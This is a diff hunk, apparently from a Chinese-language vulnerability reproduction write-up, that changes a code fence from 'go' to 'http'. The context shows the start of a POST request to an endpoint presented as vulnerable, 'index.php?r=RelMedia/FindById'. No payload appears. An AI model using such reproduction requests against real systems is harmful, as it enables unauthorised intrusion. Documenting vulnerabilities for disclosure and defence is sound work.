@@ -69,7 +69,7 @@ schema_version: "1"
 
 
 # 四、漏洞复现
-```go
+```http
 POST /index.php?r=RelMedia/FindById HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
